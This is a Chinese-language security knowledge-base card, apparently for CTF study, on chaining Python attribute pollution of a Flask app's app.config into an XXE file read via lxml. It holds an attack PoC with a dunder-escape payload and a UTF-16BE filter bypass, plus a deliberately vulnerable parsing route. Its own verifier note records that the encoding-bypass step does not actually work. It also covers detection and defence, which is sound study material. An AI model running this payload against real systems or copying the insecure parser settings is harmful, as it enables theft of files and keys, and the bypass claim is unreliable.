---
id: web-generic-xxe-lxml-config-xml-pollution
title: lxml 解析可被属性污染写入的配置 XML：外部实体读文件（UTF-16BE 绕值级过滤）
type: scenario
domain: web
path: web/generic/xxe
technique: xxe-lxml-config-injection
tags:
- xxe
- lxml
- python
- flask
- attribute-pollution
- config-injection
- file-read
- utf-16be
- encoding-bypass
cve: []
severity: high
confidence: medium
status: draft
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-17
  verified_at: '2026-11-08T08:58:36+08:00'
  notes: 原理与源码核对一致（/update 原型链污染 app.config['xml_data']，/xml_parse 用 lxml load_dtd=True/resolve_entities=True 解析并 tostring 回显，链形态成立）。但最终读取未打通且 PoC 有技术缺陷：原文该节为摘抄他人题解，无任何成功回显截图；其 xml_data2=os.popen('echo ... | iconv -t utf-16be').read() 得到的是以本地编码解码的 str（内含错位字符或 NUL），再经路由 .encode('utf-8') 后是带 0x00 的 UTF-8 字节流，并非 UTF-16，lxml 无法按 UTF-16 解码，值级过滤绕过步骤实际不可用。severity high 但只有代码形态，无执行证据。
url: /docs/web/generic/xxe/web-generic-xxe-lxml-config-xml-pollution/
draft: false
kb_aliases:
- 配置型 XXE
- app.config xml_data 污染触发 XXE
- lxml resolve_entities XXE
- 休眠 XXE sink 激活
- 属性污染链 XXE
---

## 一句话结论

当 Flask 应用把一段 XML 存在配置里（如 `app.config['xml_data']`），并用 `lxml.etree.XMLParser(load_dtd=True, resolve_entities=True)` 在某个路由中解析它时，只要另有属性污染入口能改写这段配置，攻击者就能把恶意 DOCTYPE 注入进去，借解析路由读取任意本地文件——XXE sink 与注入点是两个分离的接口。

## 原理

- **lxml 默认不展开外部实体，显式开启才会**：`XMLParser` 默认 `resolve_entities` 行为受限，只有显式 `load_dtd=True` + `resolve_entities=True`（或 `no_network=False` 配合 DTD）时，`<!ENTITY xxe SYSTEM "file:///flag">` 才会被当作 URI 读取并把内容替换进文档。开发者为了“支持 DTD 校验”常主动打开这两个开关，等于把 XXE 装回解析器。
- **XML 来自配置而非请求体，容易被当成可信数据**：业务把模板/导入内容预置在 `app.config`，解析路由直接 `app.config['xml_data'].encode()` 后 `etree.fromstring` 并 `tostring` 回显。输入源“看起来”是服务端自己写的，因此没有人对这段字符串做实体过滤。
- **属性污染把只读配置变成可写**：典型 `merge`/`update` 递归函数沿 `hasattr`/`setattr` 走 `__init__` → `__globals__` → `app` → `config`，`config` 是 dict-like，最后一个 `setattr`/`__setitem__` 直接把 `xml_data` 换成攻击者字符串。注入点（如 `/update`）与解析点（如 `/xml_parse`）分离，扫描单个接口很难发现整条链。
- **为什么能落地读文件**：解析结果被 `etree.tostring` 序列化后原样返回，实体内容进入响应体，构成有回显 XXE；进程对目标文件可读即可。
- **值级关键字过滤为什么能被编码绕过**：若过滤是对 `json` 解析后的**值字符串**做 `'file' not in value`、`'dtd' not in value` 之类的子串判断，把 XML 转成 UTF-16BE 后，每个 ASCII 字符之间多出一个 `\x00`，字符串里不再出现连续的 `file`/`dtd`/`environ` 子串；而 XML 声明与 NUL 字节让解析器按 UTF-16 重新解码，逻辑内容不变。本质仍是“检查的表示”与“解析器使用的表示”不一致。

## 触发条件

- 应用存在一段可控/半可控的 XML 配置，并由服务端解析后回显（模板预览、XML 格式化、导入预览等）。
- 解析器显式允许 DTD 与外部实体（lxml `load_dtd=True`、`resolve_entities=True`；Java 侧同类选项）。
- 存在属性污染入口，可写到 `app.config` 或持有该配置的对象；且攻击者能通过前置鉴权（如伪造 admin session）。
- 过滤若存在，只作用于原始值字符串而非解析后的实体/规范化编码。
- Web 进程对目标文件有读权限。

## 利用步骤

1. 读源码定位两个点：能写 `config`/模块全局的 merge 入口，以及读取该 XML 配置并解析的路由；确认 `XMLParser` 参数。
2. 先解决入口鉴权（如污染 `app.secret_key` 后用已知密钥签发 admin session）。
3. 构造带外部实体的最小 XML，按值级过滤情况选择编码：明文或 UTF-16BE。
4. 通过污染入口把 `config['xml_data']` 覆盖为恶意 XML。
5. 请求解析路由，观察响应中是否出现文件内容；成功后换 `/flag`、`/etc/passwd`、应用配置、私钥。
6. 无回显时改为参数实体 + 外部 DTD 外带（需要目标可出网）。

## PoC

污染配置并触发解析（payload 中键名用 `\u005f` 转义规避 dunder 黑名单）：

```python
import requests, os

url = "http://target"
cookie = {"session": "<伪造的 admin session>"}
xml_data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]><foo>&xxe;</foo>'
xml_data_utf16be = os.popen(f"echo '{xml_data}' | iconv -f utf-8 -t utf-16be").read()

payload = {
    "\u005f_init__": {
        "\u005f_globals__": {
            "app": {"config": {"xml_data": xml_data_utf16be}}
        }
    }
}
print(requests.post(f"{url}/update", json=payload, cookies=cookie).text)
print(requests.get(f"{url}/xml_parse").text)
```

对应的脆弱解析路由：

```python
@app.route('/xml_parse')
def xml_parse():
    xml_bytes = app.config['xml_data'].encode('utf-8')
    parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
    tree = etree.fromstring(xml_bytes, parser=parser)
    return Response(etree.tostring(tree, pretty_print=True), mimetype='application/xml')
```

## 变体与关联

- **注入源变体**：请求体直传 XML（经典 XXE）、文件上传（SVG/DOCX/XLSX）、数据库/缓存中存储的 XML、配置项（本卡）。
- **解析器变体**：lxml `resolve_entities`、Java `DocumentBuilderFactory` 默认特性、PHP `libxml_disable_entity_loader` 未开、.NET `XmlReaderSettings` 未禁 DTD。
- **编码绕过变体**：UTF-16BE/LE、UTF-32、带 BOM 的 UTF-8；混合大小写或拆分 `SYSTEM` 关键字。
- **关联**：[[web-generic-xxe-inband-file-read-default-insecure]]（XXE 有回显文件读取基线）、[[web-generic-xxe-utf16be-encoding-filter-bypass]]（UTF-16BE 编码绕过黑名单）、[[web-python-recursive-merge-class-pollution-globals-rce]]（同一 merge 污染入口的其它 sink）、[[web-python-merge-globals-file-source-echo-arbitrary-read]]（同源污染的另一种文件读取）。
- **边界**：解析器禁用 DTD/外部实体、配置被冻结或污染入口拒绝 dunder 键、解析结果不回显且不能出网、进程无读权限时，该链不成立。

## 检测与防御

- **修复根因**：解析器层禁用 DTD 与外部实体（lxml 不设 `load_dtd`/`resolve_entities`，或 `resolve_entities=False, no_network=True`；Java 设 `disallow-doctype-decl=true`），不要依赖字符串过滤。
- **切断污染**：配置对象只读/冻结，禁止用户 JSON 递归 merge 进 `app.config` 或模块全局；merge 拒绝 dunder 键。
- **过滤正确顺序**：若必须过滤，先按 BOM/声明解码为 UTF-8 再做关键字检查，并拒绝非 UTF-8 的 XML 编码；对解析后的实体内容做二次校验。
- **检测**：配置项在运行期被改写；请求 JSON 出现 `__init__`/`__globals__`/`config` 键；XML 解析路由返回内容出现 `root:x:0:0`、`BEGIN`、`PATH=` 等特征；解析器访问 `file://` 或异常外部 DTD。
- **加固**：Web 进程低权限运行，flag/密钥不放在可读路径；解析类接口隔离执行并限制出网。
